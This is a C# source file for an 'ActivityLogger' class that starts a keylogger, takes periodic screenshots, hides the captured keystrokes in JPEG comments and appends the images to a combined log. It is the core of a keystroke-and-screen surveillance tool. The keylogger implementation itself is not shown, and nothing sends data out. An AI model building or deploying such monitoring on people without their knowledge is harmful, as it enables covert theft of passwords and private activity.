
using Core;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace UserActivityLogger
{
    public class ActivityLogger
    {
        private TimeSpan _screenCaptureTimeInterval;
        private string _logFolder;
        private readonly IKeyLogger _keyLogger;
        private readonly LogFileAppender _fileCombiner;
        private readonly KeyProcessor _keyProcesor;

        public ActivityLogger(TimeSpan fulshTimeInterval, string logFolder, IKeyLogger keyLogger)
        {
            _screenCaptureTimeInterval = fulshTimeInterval;
            _logFolder = logFolder;
            _keyLogger = keyLogger;
            _keyProcesor = new KeyProcessor();
            _fileCombiner = new LogFileAppender(_logFolder);
        }

        public void StartLoging()
        {
            _keyLogger.StartListening();
            //Add one log when process started
            AddActivityLog();


            while (true)
            {
                Thread.Sleep(_screenCaptureTimeInterval);
                try
                {
                    var captureImgpath = Path.Combine(_logFolder, Guid.NewGuid().ToString() + ".jpg");
                    var keysLogged = _keyLogger.GetKeys();
                    if (!string.IsNullOrEmpty(keysLogged))
                    {
                        AddActivityLog();
                    }
                }
                catch (Exception ex)
                {
                    ErrrorLogger.LogError(ex);
                }

            }
        }

        private void AddActivityLog()
        {
            var captureImgpath = Path.Combine(_logFolder, Guid.NewGuid().ToString() + ".jpg");
            var img = ScreenCapture.CaptureScreen();
            img.Save(captureImgpath, ImageFormat.Jpeg);
            new ImageCommentEmbedder().AddImageComment(captureImgpath, _keyLogger.GetKeys());
            _keyLogger.CleanBuffer();
            _fileCombiner.AppendFile(captureImgpath);
            File.Delete(captureImgpath);
        }
    }
}
